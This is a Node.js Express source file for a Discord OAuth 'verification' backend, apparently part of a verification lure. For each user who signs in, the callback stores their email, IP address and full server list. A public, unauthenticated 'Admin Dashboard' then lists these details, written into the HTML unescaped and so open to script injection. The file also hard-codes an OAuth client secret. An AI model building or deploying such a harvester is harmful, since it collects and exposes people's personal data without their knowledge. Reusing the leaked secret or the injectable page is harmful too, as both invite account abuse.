const express = require("express");
const axios = require("axios");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.set("trust proxy", true);

/* ============ CONFIG ============ */
const CLIENT_ID = "1456246007858987150";
const CLIENT_SECRET = "TOpGnsPmS_jaNCfEm9IgO3OAf1nJCYol";
const REDIRECT_URI = "https://verify36.netlify.app/callback";
/* ================================= */


let users = [];

/* ===== ADMIN DASHBOARD (مباشر) ===== */
app.get("/", (req, res) => {
  let html = `
  <html>
  <head>
    <style>
      body { font-family: Arial; background:#2c2f33; color:#fff; }
      li { background:#23272a; padding:15px; margin:15px; border-radius:10px; }
      img { border-radius:50%; }
    </style>
  </head>
  <body>
    <h1>Admin Dashboard</h1>
    <h3>Total Verified Users: ${users.length}</h3>
    <ul>
  `;

  users.forEach(u => {
    html += `
      <li>
        <img src="${u.avatar}" width="50"><br>
        <b>${u.username}</b> (${u.id})<br>
        Email: ${u.email || "N/A"}<br>
        IP: ${u.ip}<br>
        Servers: ${u.guilds.length}
      </li>
    `;
  });

  html += `
    </ul>
  </body>
  </html>
  `;

  res.send(html);
});

/* ===== CALLBACK ===== */
app.get("/callback", async (req, res) => {
  try {
    const code = req.query.code;
    if (!code) return res.send("No code");

    const ip =
      req.headers["x-forwarded-for"] ||
      req.socket.remoteAddress;

    const tokenRes = await axios.post(
      "https://discord.com/api/oauth2/token",
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: "authorization_code",
        code,
        redirect_uri: REDIRECT_URI
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );

    const accessToken = tokenRes.data.access_token;

    const userRes = await axios.get(
      "https://discord.com/api/users/@me",
      { headers: { Authorization: `Bearer ${accessToken}` } }
    );

    const guildsRes = await axios.get(
      "https://discord.com/api/users/@me/guilds",
      { headers: { Authorization: `Bearer ${accessToken}` } }
    );

    users.push({
      id: userRes.data.id,
      username: userRes.data.username,
      email: userRes.data.email,
      avatar: `https://cdn.discordapp.com/avatars/${userRes.data.id}/${userRes.data.avatar}.png`,
      guilds: guildsRes.data,
      ip
    });

    // يرجعه لموقع GitHub Pages
    res.redirect("https://YOUR_GITHUB_USERNAME.github.io/");
  } catch (e) {
    console.log(e.response?.data || e);
    res.send("OAuth Error");
  }
});

app.listen(3000, () =>
  console.log("Backend running on port 3000")
);
